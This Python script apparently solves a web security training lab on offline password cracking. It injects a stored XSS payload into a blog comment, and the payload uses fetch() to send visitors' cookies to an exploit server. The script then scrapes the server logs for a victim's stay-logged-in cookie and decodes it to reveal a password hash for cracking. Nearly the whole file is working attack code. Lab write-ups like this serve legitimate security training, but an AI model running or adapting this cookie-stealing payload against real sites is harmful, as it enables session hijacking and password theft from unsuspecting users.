#####################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 30/8/2023
#
# Lab: Offline password cracking
#
# Steps: 1. Exploit XSS vulnerability in comment functionlity
#        2. Extract victim cookie from the exploit server logs
#        3. Decode the cookie to get the hashed password
#        4. Crack the hash to get the plain password
#
#####################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore
import base64


#######################################################
# Function used to inject XSS in comment functionality
#######################################################
def exploit_xss_in_comment_functionality(lab_url, exploit_server_url):
    # set data to send via POST
    data = {
        "postId": "2",
        "comment": f"<script>fetch('{exploit_server_url}/exploit?cookie=' + document.cookie)</script/> Exploited!",
        "name": "Hacker",
        "email": "hacker@hacker.me",
        "website": ""
    }

    try:
        # inject payload in a comment
        res = requests.post(f"{lab_url}/post/comment", data)

    except:
        print(Fore.RED + "Failed to exploit XSS through exception")
        exit(1)

    # if injection is successful
    if res.status_code == 200:
        print(Fore.WHITE + "1. Exploit XSS in comment functionality.. OK")
        
        return True
    
    else:
        return False
    


##################################################################
# Function used to extract the cookie from the exploit sever logs
##################################################################
def extract_cookie_from_logs(exploit_server_url):
    try:
        # fetch /log page
        res = requests.get(f"{exploit_server_url}/log")

    except:
        print(Fore.RED + "Failed to GET the /log from the server")
        exit(1)

    # try to extract cookie from logs
    cookie = re.findall("stay-logged-in=(.*) HTTP", res.text)
    
    # if you found the cookie in logs
    if len(cookie) != 0:
        print(Fore.WHITE + "2. Get stay-logged-in cookie of the victim from exploit sever logs.. OK")
        
        return cookie[0]
    
    else:
        return None
    

   

###########
# Main
###########

# change this to your lab URL
lab_url = "https://0a65002d04b3bcf283f910fa001b0060.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0a5a001a048bbc3883090f7601bd0005.exploit-server.net"


# try to inject the XSS payload
is_exploited = exploit_xss_in_comment_functionality(lab_url, exploit_server_url) 

# if the payload is injected successfully
if is_exploited: 
    
    # try to extract the cookie from your server logs
    cookie = extract_cookie_from_logs(exploit_server_url) 
    
    # if you found the cookie
    if cookie != None:       
        print(Fore.WHITE + "3. Decoding the encrypted cookie.. OK")
        
        # decode the cookie to get the hash
        decoded = base64.b64decode(cookie).decode() 
        
        # split the decoded string to obtain the hash only without the username
        hash = decoded.split(":")[1] 

        print(Fore.YELLOW + "✅ Password hash: " + Fore.GREEN + hash)
        print(Fore.WHITE + "Crack this hash using any online hash cracker")
    
    else:
        print(Fore.RED + "No cookies are found is the logs")

else:
    print(Fore.RED + "Failed to inject XSS in the comment")
